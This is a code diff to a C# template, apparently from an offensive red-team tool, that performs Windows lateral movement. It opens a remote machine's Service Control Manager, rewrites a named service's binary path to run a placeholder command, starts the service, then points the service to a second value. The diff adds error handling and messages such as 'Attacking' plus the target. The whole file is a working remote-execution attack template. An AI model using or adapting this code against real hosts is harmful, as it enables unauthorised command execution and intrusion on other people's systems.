@@ -32,21 +32,44 @@ string lpDisplayName);
         static void Main(string[] args)
         {
             String target = "[[[[targetHostName]]]]";
-            
+            Console.WriteLine("Attacking " + target);
             IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
+            
+            IntPtr schService = new IntPtr();
+            string payload = "";
+            bool bResult = false;
 
-            string ServiceName = "[[[[targetService]]]]";
-            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);
-
-            string payload = "[[[[preCommand]]]]";
-            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, 
-            null, null, null, null);
-            bResult = StartService(schService, 0, null);
-
-            payload = "[[[[retargetServiceTo]]]]";
-            bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, 
-            null, null, null, null);
-            bResult = StartService(schService, 0, null);
+            try{
+                string ServiceName = "[[[[targetService]]]]";
+                Console.WriteLine("Opening Service " + ServiceName);
+                schService = OpenService(SCMHandle, ServiceName, 0xF01FF);
+            }
+            catch(Exception e){
+                Console.WriteLine("Error opening service");
+                Console.WriteLine(e.Message);
+            }
+            try{
+                payload = "[[[[preCommand]]]]";
+                Console.WriteLine("Running precommand: "+payload);
+                bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, 
+                null, null, null, null);
+                bResult = StartService(schService, 0, null);
+            }
+            catch(Exception e){
+                Console.WriteLine("Error on precommand");
+                Console.WriteLine(e.Message);
+            }
+            try{
+                payload = "[[[[retargetServiceTo]]]]";
+                Console.WriteLine("Retargeting service to " + payload);
+                bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, 
+                null, null, null, null);
+                bResult = StartService(schService, 0, null);
+            }
+            catch(Exception e){
+                Console.WriteLine("Error starting retargeted service");
+                Console.WriteLine(e.Message);
+            }
         } 
     }
 }
